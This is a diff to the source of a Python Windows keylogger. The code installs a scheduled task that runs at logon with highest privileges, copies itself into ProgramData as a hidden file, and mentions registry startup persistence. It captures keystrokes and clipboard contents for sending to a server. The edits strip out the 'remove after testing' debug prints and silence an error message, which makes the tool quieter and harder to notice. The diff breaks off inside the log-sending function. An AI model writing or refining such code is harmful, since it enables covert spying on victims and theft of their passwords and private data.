@@ -41,7 +41,7 @@ def set_scheduler():
     try:
         subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{path_e2}" /sc onlogon /rl highest /f', shell=True, check=True,creationflags=0x08000000)
     except Exception as e:
-        pass
+        print(f"Error setting scheduler: {e}")
 scheduler_thrd = threading.Thread(target=set_scheduler, daemon=True)
 scheduler_thrd.start()
 ##
@@ -50,7 +50,8 @@ try:
     copy(current_file, path_e2)
     attribute_set = ctypes.windll.kernel32.SetFileAttributesW(path_e2, 0x02)
 except Exception as e:
-    print(f"Error copying to ProgramData: {e}")
+    # print(f"Error copying to ProgramData: {e}")
+    pass
 #hide and add to startup with registry
 try:
     ctypes.windll.kernel32.SetFileAttributesW(path_e2, 128)
@@ -158,7 +159,6 @@ def on_key_press(key):
     elif "Key." not in k: 
         if ord(k) >= 32 and ord(k) <= 126:
             keystroke_buffer.append(k)
-            print("Key pressed: ", k) #remove after testing
 
 #save logs as backup 
 def save_to_file(content):
@@ -177,7 +177,6 @@ def send_logs_to_server():
     with file_lock:
         if keystroke_buffer:
             data_to_send = "".join(keystroke_buffer)
-            print("Data to send: ", data_to_send) #remove after testing
             keystroke_buffer = []
         try:
             cptext = paste()
